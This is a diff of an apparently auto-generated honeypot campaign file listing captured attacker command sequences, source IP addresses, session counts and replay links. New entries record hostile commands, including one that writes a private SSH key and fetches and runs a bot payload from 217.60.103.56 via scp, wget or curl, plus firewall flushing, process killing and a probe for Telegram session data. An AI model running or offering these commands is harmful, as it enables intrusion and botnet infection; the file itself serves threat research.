@@ -1,7 +1,7 @@
 {
   "schema_version": "1.0",
-  "generated_at": "2026-09-13T08:30:14.107593Z",
-  "count": 156,
+  "generated_at": "2026-09-13T21:00:14.550563Z",
+  "count": 159,
   "note": "`sessions` and `source_addresses` are capture-wide. `published_sessions` and `published_addresses` are what the shipped database holds, which is a pruned subset - so a campaign's session count is usually larger than the number of sessions you can open.",
   "campaigns": [
     {
@@ -12,12 +12,12 @@
         "cd /proc && cat self/cmdline"
       ],
       "commands_per_session": 2,
-      "sessions": 594,
-      "source_addresses": 586,
+      "sessions": 599,
+      "source_addresses": 591,
       "published_sessions": 200,
       "published_addresses": 198,
       "first_seen": "2026-08-18T04:41:18.250523Z",
-      "last_seen": "2026-09-13T05:21:59.164554Z",
+      "last_seen": "2026-09-13T19:56:14.312750Z",
       "representative_session": "142d7660a747",
       "replay_url": "../../replays/142d7660a747.cast",
       "replay_duration_s": 1.822718,
@@ -25,7 +25,6 @@
       "addresses": [
         "102.221.13.2",
         "102.98.5.128",
-        "104.195.242.144",
         "105.157.165.90",
         "109.172.160.110",
         "109.226.236.44",
@@ -69,7 +68,6 @@
         "178.125.218.248",
         "178.134.81.196",
         "178.136.110.214",
-        "178.136.38.51",
         "178.136.47.23",
         "178.150.235.41",
         "178.159.218.170",
@@ -88,7 +86,6 @@
         "185.230.206.88",
         "185.239.25.58",
         "185.255.50.184",
-        "185.39.196.245",
         "185.39.28.24",
         "185.48.57.248",
         "185.99.5.134",
@@ -138,6 +135,7 @@
         "31.148.20.173",
         "31.162.136.141",
         "31.23.143.129",
+        "31.42.171.96",
         "31.43.240.225",
         "37.214.20.163",
         "39.194.2.15",
@@ -150,10 +148,12 @@
         "45.41.105.45",
         "45.85.36.244",
         "46.109.195.149",
+        "46.187.15.163",
         "46.187.54.150",
         "46.33.112.194",
         "46.33.39.1",
         "46.36.123.219",
+        "46.53.240.221",
         "46.63.151.35",
         "46.98.62.10",
         "47.15.93.227",
@@ -192,9 +192,9 @@
         "84.54.70.225",
         "86.174.144.23",
         "86.223.191.252",
-        "86.62.14.103",
         "88.147.152.191",
         "88.147.152.229",
+        "88.190.76.1",
         "88.80.63.109",
         "88.90.224.38",
         "89.151.186.108",
@@ -204,7 +204,6 @@
         "91.193.172.192",
         "91.198.249.59",
         "91.214.208.172",
-        "91.215.146.158",
         "91.215.146.82",
         "91.221.6.148",
         "91.233.172.241",
@@ -212,6 +211,7 @@
         "92.206.254.169",
         "92.253.236.186",
         "92.52.176.13",
+        "93.171.240.79",
         "93.178.119.156",
         "94.179.165.191",
         "95.105.1.221",
@@ -260,12 +260,12 @@
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
       ],
       "commands_per_session": 31,
-      "sessions": 180,
+      "sessions": 182,
       "source_addresses": 169,
-      "published_sessions": 180,
+      "published_sessions": 182,
       "published_addresses": 169,
       "first_seen": "2026-08-17T21:24:34.606793Z",
-      "last_seen": "2026-09-13T05:02:30.544255Z",
+      "last_seen": "2026-09-13T15:52:04.894755Z",
       "representative_session": "ef8e8dcd9b60",
       "replay_url": "../../replays/ef8e8dcd9b60.cast",
       "replay_duration_s": 49.092673,
@@ -626,12 +626,12 @@
         "/bin/busybox"
       ],
       "commands_per_session": 31,
-      "sessions": 101,
-      "source_addresses": 84,
-      "published_sessions": 101,
-      "published_addresses": 84,
+      "sessions": 102,
+      "source_addresses": 85,
+      "published_sessions": 102,
+      "published_addresses": 85,
       "first_seen": "2026-08-17T17:07:37.999357Z",
-      "last_seen": "2026-09-13T06:36:21.071238Z",
+      "last_seen": "2026-09-13T11:35:28.063667Z",
       "representative_session": "f89eebb3e826",
       "replay_url": "../../replays/f89eebb3e826.cast",
       "replay_duration_s": 43.268332,
@@ -694,6 +694,7 @@
         "216.244.201.94",
         "216.244.247.34",
         "216.244.250.186",
+        "216.244.254.177",
         "223.87.148.234",
         "223.90.99.223",
         "27.105.28.54",
@@ -808,17 +809,18 @@
         "/bin/busybox"
       ],
       "commands_per_session": 22,
-      "sessions": 20,
-      "source_addresses": 19,
-      "published_sessions": 20,
-      "published_addresses": 19,
+      "sessions": 21,
+      "source_addresses": 20,
+      "published_sessions": 21,
+      "published_addresses": 20,
       "first_seen": "2026-08-17T18:19:22.176042Z",
-      "last_seen": "2026-09-13T05:24:31.987483Z",
+      "last_seen": "2026-09-13T08:39:34.700854Z",
       "representative_session": "0aea01df2763",
       "replay_url": "../../replays/0aea01df2763.cast",
       "replay_duration_s": 19.118494,
       "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/0aea01df2763",
       "addresses": [
+        "114.37.146.169",
         "115.211.69.43",
         "115.215.8.155",
         "118.108.144.248",
@@ -944,17 +946,18 @@
         "sh"
       ],
       "commands_per_session": 5,
-      "sessions": 27439,
+      "sessions": 27440,
       "source_addresses": 15,
       "published_sessions": 200,
-      "published_addresses": 2,
+      "published_addresses": 3,
       "first_seen": "2026-08-18T02:36:53.950685Z",
-      "last_seen": "2026-09-13T06:00:36.699238Z",
+      "last_seen": "2026-09-13T09:54:31.485932Z",
       "representative_session": "cdbc143a5932",
       "replay_url": "../../replays/cdbc143a5932.cast",
       "replay_duration_s": 10.310759,
       "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/cdbc143a5932",
       "addresses": [
+        "148.72.208.160",
         "72.47.208.106",
         "92.204.128.6"
       ]
@@ -1061,12 +1064,12 @@
         "/bin/busybox UNSTABLE"
       ],
       "commands_per_session": 4,
-      "sessions": 255,
+      "sessions": 256,
       "source_addresses": 11,
       "published_sessions": 200,
       "published_addresses": 11,
       "first_seen": "2026-08-17T20:15:53.564469Z",
-      "last_seen": "2026-09-13T01:12:32.190573Z",
+      "last_seen": "2026-09-13T20:02:06.906640Z",
       "representative_session": "0095beec9a39",
       "replay_url": "../../replays/0095beec9a39.cast",
       "replay_duration_s": 38.766151,
@@ -1249,6 +1252,41 @@
       ]
     },
     {
+      "signature": "1091addd578238c7",
+      "class": "attack",
+      "command_sequence": [
+        "/ip cloud print",
+        "ifconfig",
+        "uname -a",
+        "cat /proc/cpuinfo",
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+        "locate D877F783D5D3EF8Cs",
+        "echo Hi | cat -n"
+      ],
+      "commands_per_session": 9,
+      "sessions": 7,
+      "source_addresses": 7,
+      "published_sessions": 7,
+      "published_addresses": 7,
+      "first_seen": "2026-09-01T11:24:39.636790Z",
+      "last_seen": "2026-09-13T09:16:31.334838Z",
+      "representative_session": "0d0d9efff762",
+      "replay_url": "../../replays/0d0d9efff762.cast",
+      "replay_duration_s": 0.000201,
+      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/0d0d9efff762",
+      "addresses": [
+        "121.134.90.172",
+        "37.148.102.18",
+        "38.148.20.67",
+        "73.147.19.171",
+        "85.225.133.42",
+        "85.30.212.24",
+        "93.218.46.60"
+      ]
+    },
+    {
       "signature": "e97166b54500da3a",
       "class": "recon",
       "command_sequence": [
@@ -1273,6 +1311,37 @@
         "178.74.109.204",
         "46.41.111.104",
         "95.104.184.252"
+      ]
+    },
+    {
+      "signature": "f7303c94cf52f8d5",
+      "class": "attack",
+      "command_sequence": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox V3G4"
+      ],
+      "commands_per_session": 5,
+      "sessions": 7,
+      "source_addresses": 7,
+      "published_sessions": 7,
+      "published_addresses": 7,
+      "first_seen": "2026-08-22T06:54:52.603797Z",
+      "last_seen": "2026-09-13T16:51:08.840364Z",
+      "representative_session": "ba6f828663e2",
+      "replay_url": "../../replays/ba6f828663e2.cast",
+      "replay_duration_s": 1.21131,
+      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/ba6f828663e2",
+      "addresses": [
+        "131.221.50.248",
+        "143.255.217.176",
+        "177.84.92.123",
+        "197.45.94.242",
+        "197.46.126.37",
+        "41.40.73.82",
+        "41.42.148.29"
       ]
     },
     {
@@ -1335,40 +1404,6 @@
         "180.149.210.43",
         "186.125.212.120",
         "31.190.249.49"
-      ]
-    },
-    {
-      "signature": "1091addd578238c7",
-      "class": "attack",
-      "command_sequence": [
-        "/ip cloud print",
-        "ifconfig",
-        "uname -a",
-        "cat /proc/cpuinfo",
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
-        "locate D877F783D5D3EF8Cs",
-        "echo Hi | cat -n"
-      ],
-      "commands_per_session": 9,
-      "sessions": 6,
-      "source_addresses": 6,
-      "published_sessions": 6,
-      "published_addresses": 6,
-      "first_seen": "2026-09-01T11:24:39.636790Z",
-      "last_seen": "2026-09-10T09:50:29.315918Z",
-      "representative_session": "0d0d9efff762",
-      "replay_url": "../../replays/0d0d9efff762.cast",
-      "replay_duration_s": 0.000201,
-      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/0d0d9efff762",
-      "addresses": [
-        "121.134.90.172",
-        "37.148.102.18",
-        "38.148.20.67",
-        "85.225.133.42",
-        "85.30.212.24",
-        "93.218.46.60"
       ]
     },
     {
@@ -1499,36 +1534,6 @@
         "211.250.26.54",
         "222.112.46.78",
         "92.68.11.140"
-      ]
-    },
-    {
-      "signature": "f7303c94cf52f8d5",
-      "class": "attack",
-      "command_sequence": [
-        "enable",
-        "system",
-        "shell",
-        "sh",
-        "/bin/busybox V3G4"
-      ],
-      "commands_per_session": 5,
-      "sessions": 6,
-      "source_addresses": 6,
-      "published_sessions": 6,
-      "published_addresses": 6,
-      "first_seen": "2026-08-22T06:54:52.603797Z",
-      "last_seen": "2026-09-12T12:26:33.931058Z",
-      "representative_session": "c3a13688d708",
-      "replay_url": "../../replays/c3a13688d708.cast",
-      "replay_duration_s": 1.21131,
-      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/c3a13688d708",
-      "addresses": [
-        "143.255.217.176",
-        "177.84.92.123",
-        "197.45.94.242",
-        "197.46.126.37",
-        "41.40.73.82",
-        "41.42.148.29"
       ]
     },
     {
@@ -1778,6 +1783,56 @@
         "198.199.94.79",
         "47.80.63.229",
         "8.134.124.8"
+      ]
+    },
+    {
+      "signature": "10c639bfac8873ac",
+      "class": "attack",
+      "command_sequence": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "linuxshell",
+        "ping ;sh",
+        "/bin/busybox",
+        "iptables -F",
+        "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
+        "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/",
+        "/bin/busybox echo > /var/run/.fxcat && sh /var/run/.fxcat && cd /var/run/",
+        "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
+        "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/",
+        "/bin/busybox echo > /dev/shm/.fxcat && sh /dev/shm/.fxcat && cd /dev/shm/",
+        "/bin/busybox echo > /etc/.fxcat && sh /etc/.fxcat && cd /etc/",
+        "/bin/busybox echo > /mnt/.fxcat && sh /mnt/.fxcat && cd /mnt/",
+        "/bin/busybox echo > /usr/.fxcat && sh /usr/.fxcat && cd /usr/",
+        "/bin/busybox echo > /boot/.fxcat && sh /boot/.fxcat && cd /boot/",
+        "/bin/busybox echo > /home/.fxcat && sh /home/.fxcat && cd /home/",
+        "/bin/busybox",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done",
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
+        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
+        "rm -rf .ffaaxx .d",
+        "/bin/busybox"
+      ],
+      "commands_per_session": 28,
+      "sessions": 3,
+      "source_addresses": 3,
+      "published_sessions": 3,
+      "published_addresses": 3,
+      "first_seen": "2026-08-31T21:03:41.285645Z",
+      "last_seen": "2026-09-13T10:02:11.472641Z",
+      "representative_session": "a1dd9a5ec2b3",
+      "replay_url": "../../replays/a1dd9a5ec2b3.cast",
+      "replay_duration_s": 5.707067,
+      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/a1dd9a5ec2b3",
+      "addresses": [
+        "201.140.220.172",
+        "59.97.240.142",
+        "88.151.90.168"
       ]
     },
     {
@@ -2134,55 +2189,6 @@
       "addresses": [
         "109.184.135.82",
         "161.142.228.252"
-      ]
-    },
-    {
-      "signature": "10c639bfac8873ac",
-      "class": "attack",
-      "command_sequence": [
-        "enable",
-        "system",
-        "shell",
-        "sh",
-        "linuxshell",
-        "ping ;sh",
-        "/bin/busybox",
-        "iptables -F",
-        "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
-        "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/",
-        "/bin/busybox echo > /var/run/.fxcat && sh /var/run/.fxcat && cd /var/run/",
-        "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
-        "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/",
-        "/bin/busybox echo > /dev/shm/.fxcat && sh /dev/shm/.fxcat && cd /dev/shm/",
-        "/bin/busybox echo > /etc/.fxcat && sh /etc/.fxcat && cd /etc/",
-        "/bin/busybox echo > /mnt/.fxcat && sh /mnt/.fxcat && cd /mnt/",
-        "/bin/busybox echo > /usr/.fxcat && sh /usr/.fxcat && cd /usr/",
-        "/bin/busybox echo > /boot/.fxcat && sh /boot/.fxcat && cd /boot/",
-        "/bin/busybox echo > /home/.fxcat && sh /home/.fxcat && cd /home/",
-        "/bin/busybox",
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
-        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then while IFS= read -r line; do case \"$line\" in *'(deleted)'*) kill -9 \"$pid_num\"; break;; esac; done < \"$pid/maps\"; fi; done",
-        "rm -rf .ffaaxx .d",
-        "/bin/busybox"
-      ],
-      "commands_per_session": 28,
-      "sessions": 2,
-      "source_addresses": 2,
-      "published_sessions": 2,
-      "published_addresses": 2,
-      "first_seen": "2026-08-31T21:03:41.285645Z",
-      "last_seen": "2026-09-02T23:05:23.181357Z",
-      "representative_session": "a1dd9a5ec2b3",
-      "replay_url": "../../replays/a1dd9a5ec2b3.cast",
-      "replay_duration_s": 5.707067,
-      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/a1dd9a5ec2b3",
-      "addresses": [
-        "201.140.220.172",
-        "59.97.240.142"
       ]
     },
     {
@@ -4746,6 +4752,29 @@
       ]
     },
     {
+      "signature": "6dea1cfdaf3e90f6",
+      "class": "attack",
+      "command_sequence": [
+        "shell",
+        "sh",
+        "/bin/busybox ECCHI"
+      ],
+      "commands_per_session": 3,
+      "sessions": 1,
+      "source_addresses": 1,
+      "published_sessions": 1,
+      "published_addresses": 1,
+      "first_seen": "2026-09-13T11:37:15.058206Z",
+      "last_seen": "2026-09-13T11:37:15.058206Z",
+      "representative_session": "192c8adc5433",
+      "replay_url": "../../replays/192c8adc5433.cast",
+      "replay_duration_s": 0.644246,
+      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/192c8adc5433",
+      "addresses": [
+        "197.48.156.175"
+      ]
+    },
+    {
       "signature": "700e8f0c0f050d03",
       "class": "attack",
       "command_sequence": [
@@ -7305,6 +7334,34 @@
       ]
     },
     {
+      "signature": "b72a4f9b962da755",
+      "class": "attack",
+      "command_sequence": [
+        "LC_ALL=C top -bn1",
+        "scp -t /bin/eyvtlcthooh4p341fte0vzh6qf",
+        "LC_ALL=C /bin/eyvtlcthooh4p341fte0vzh6qf",
+        "LC_ALL=C rm -f /bin/eyvtlcthooh4p341fte0vzh6qf",
+        "LC_ALL=C rm -f /bin/eyvtlcthooh4p341fte0vzh6qf",
+        "scp -t /bin/eyvtlcthooh4p341fte0vzh6qf",
+        "LC_ALL=C /bin/eyvtlcthooh4p341fte0vzh6qf",
+        "LC_ALL=C rm -f /bin/eyvtlcthooh4p341fte0vzh6qf"
+      ],
+      "commands_per_session": 8,
+      "sessions": 1,
+      "source_addresses": 1,
+      "published_sessions": 1,
+      "published_addresses": 1,
+      "first_seen": "2026-09-13T10:22:32.602845Z",
+      "last_seen": "2026-09-13T10:22:32.602845Z",
+      "representative_session": "c332b8357b50",
+      "replay_url": null,
+      "replay_duration_s": null,
+      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/c332b8357b50",
+      "addresses": [
+        "192.42.116.42"
+      ]
+    },
+    {
       "signature": "b8f9ffffa75fafa8",
       "class": "attack",
       "command_sequence": [
@@ -8273,6 +8330,42 @@
       "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/1f9ad097a4c4",
       "addresses": [
         "112.46.213.103"
+      ]
+    },
+    {
+      "signature": "c975794d4c4fd2ca",
+      "class": "attack",
+      "command_sequence": [
+        "id",
+        "cat /etc/passwd",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "bash",
+        "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
+        "QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ",
+        "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg",
+        "AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9",
+        "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
+        "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\""
+      ],
+      "commands_per_session": 16,
+      "sessions": 1,
+      "source_addresses": 1,
+      "published_sessions": 1,
+      "published_addresses": 1,
+      "first_seen": "2026-09-13T08:43:41.393963Z",
+      "last_seen": "2026-09-13T08:43:41.393963Z",
+      "representative_session": "913499507389",
+      "replay_url": "../../replays/913499507389.cast",
+      "replay_duration_s": 9.767313,
+      "dashboard_url": "https://ap6pack.github.io/dist/honeypot/#session/913499507389",
+      "addresses": [
+        "82.67.202.213"
       ]
     },
     {
